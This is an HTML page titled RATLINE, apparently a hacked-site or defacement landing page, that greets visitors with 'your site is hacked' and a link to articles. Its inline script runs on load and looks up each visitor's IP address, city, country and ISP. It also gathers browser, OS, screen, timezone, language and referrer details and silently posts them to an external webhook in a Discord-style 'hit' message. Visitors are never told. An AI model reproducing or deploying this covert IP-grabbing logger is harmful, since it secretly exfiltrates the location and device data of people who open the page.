<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RATLINE</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Helvetica Neue', Arial, sans-serif;
    background: #f7f7f5;
    color: #1a1a1a;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    gap: 24px;
    text-align: center;
    padding: 0 24px;
  }
  .ratline {
    font-size: 64px;
    font-weight: 900;
    letter-spacing: 14px;
    color: #000;
    text-transform: uppercase;
  }
  .hacked-msg {
    font-size: 16px;
    color: #c41e3a;
    font-weight: 600;
    letter-spacing: 1px;
    max-width: 500px;
    line-height: 1.6;
  }
  .articles-btn {
    display: inline-block;
    padding: 14px 32px;
    background: #c41e3a;
    color: #fff;
    text-decoration: none;
    font-size: 14px;
    font-weight: 600;
    letter-spacing: 1px;
    border-radius: 6px;
    transition: opacity 0.2s;
    margin-top: 8px;
  }
  .articles-btn:hover { opacity: 0.85; }
</style>
<base target="_blank">
</head>
<body>

<audio id="bg-music" src="song.mp3" autoplay loop></audio>

<div class="ratline">RATLINE</div>
<div class="hacked-msg">You are probably here because your site is hacked.</div>
<a href="article.html" class="articles-btn">Go to Articles</a>

<script>
  (function() {
    const audio = document.getElementById('bg-music');
    audio.volume = 0.4;

    const WEBHOOK = "https://young-unicorn-12.webhook.cool";

    function getBrowser() {
      const ua = navigator.userAgent;
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
      return "Unknown";
    }

    function getOS() {
      const ua = navigator.userAgent;
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac")) return "macOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      return "Unknown";
    }

    fetch("https://ipapi.co/json/")
      .then(r => r.json())
      .then(data => {
        const payload = {
          embeds: [{
            title: "hit",
            color: 0x2f3136,
            fields: [
              { name: "ip", value: data.ip || "n/a", inline: true },
              { name: "city", value: (data.city || "") + ", " + (data.region || ""), inline: true },
              { name: "country", value: data.country_name || "n/a", inline: true },
              { name: "isp", value: data.org || "n/a", inline: false },
              { name: "browser", value: getBrowser(), inline: true },
              { name: "os", value: getOS(), inline: true },
              { name: "screen", value: screen.width + "x" + screen.height, inline: true },
              { name: "timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
              { name: "lang", value: navigator.language, inline: true },
              { name: "referrer", value: document.referrer || "direct", inline: false },
              { name: "page", value: location.href, inline: false }
            ],
            footer: { text: new Date().toLocaleString() }
          }]
        };

        fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {});
      })
      .catch(() => {});
  })();
</script>

</body>
</html>
